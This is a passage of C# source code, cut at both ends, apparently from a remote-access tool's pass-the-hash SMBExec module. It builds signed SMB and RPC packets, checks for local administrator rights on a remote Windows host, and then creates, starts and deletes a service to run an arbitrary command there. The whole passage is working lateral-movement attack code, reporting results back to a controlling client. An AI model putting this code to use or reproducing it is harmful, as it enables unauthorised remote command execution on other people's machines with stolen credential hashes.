                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_Session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "RPCBind";

                                        }
                                        break;
                                    case "RPCBind":
                                        {
                                            SMB_FID = PTHSMBExecHelper.getByteRange(SMBClientReceive, 42, 43);
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x00, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "OpenSCManagerW";
                                        }
                                        break;
                                    case "ReadAndXRequest": //Broken
                                        {
                                            Thread.Sleep(sleep);
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBReadAndXRequest();
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = SMB_client_stage_next;

                                        }
                                        break;

                                    case "OpenSCManagerW":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            //Null ref exception?
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_Data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, (RPC_data.Length + SCM_data.Length));
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_Data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_Session_Service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_Session_Service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_Service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_Session_Service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);

                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "CheckAccess";

                                        }
                                        break;
                                    case "CheckAccess":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 111)) == "00-00-00-00" && BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 88, 107)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                            {
                                                SMB_service_manager_context_handle = PTHSMBExecHelper.getByteRange(SMBClientReceive, 88, 107);
                                                if (SMB_execute)
                                                {
                                                    OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                    SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                    if (SCM_data.Length < SMB_split_index)
                                                    {
                                                        SMBClientStage = "CreateServiceW";
                                                    }
                                                    else
                                                    {
                                                        SMBClientStage = "CreateServiceW_First";
                                                    }
                                                }
                                                else
                                                {
                                                    //TODO Packet Response
                                                    new Packets.ClientPackets.DoSMBExecResponse("Execution Success: User is a local Administrator", true).Execute(client);
                                                    SMB_close_service_handle_stage = 2;
                                                    SMBClientStage = "CloseServiceHandle";
                                                }

                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 111)) == "05-00-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: User is not a local Administrator or does not have the required permissions", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Unknown Error", false).Execute(client);
                                                //TODO Packet Response
                                                SMBExec_failed = true;
                                            }
                                        }

                                        break;

                                    case "CreateServiceW":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "StartServiceW";
                                        }
                                        break;
                                    case "CreateServiceW_First":
                                        {
                                            SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_first = PTHSMBExecHelper.getByteRange(SCM_data, 0, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                            SMB_split_index_tracker = SMB_split_index;
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if (SMB_split_stage_final <= 2)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMB_split_stage = 2;
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        }
                                        break;
                                    case "CreateServiceW_Middle":
                                        {
                                            SMB_split_stage++;
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_middle = PTHSMBExecHelper.getByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index_tracker + SMB_split_index - 1);
                                            SMB_split_index_tracker += SMB_split_index;
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if (SMB_split_stage >= SMB_split_stage_final)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        }
                                        break;

                                    case "CreateServiceW_Last":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x48 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SCM_data_last = PTHSMBExecHelper.getByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                            SMB_split_index_tracker += SMB_split_index;
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "StartServiceW";
                                        }
                                        break;

                                    case "StartServiceW":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 112, 115)) == "00-00-00-00")
                                            {
                                                SMB_service_context_handle = PTHSMBExecHelper.getByteRange(SMBClientReceive, 92, 111);
                                                packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                                if (SMB_signing)
                                                {
                                                    packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                    SMB_signing_counter += 2;
                                                    byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                    packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                                }
                                                OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMStartServiceW(SMB_service_context_handle);
                                                SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                                byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                                OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                                int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                                byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                    byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                    SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                    SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                    SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SCM_data);
                                                    byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                    SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                    packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                    SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                                }
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadAndXRequest";
                                                SMB_client_stage_next = "DeleteServiceW";
                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 112, 115)) == "31-04-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Service creation failed.", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Context Mismatch", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                        }
                                        break;
                                    case "DeleteServiceW":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 88, 91)) == "1d-04-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Succeeded: Process Started", true).Execute(client);
                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                            {
                                                //TODO Packet Response
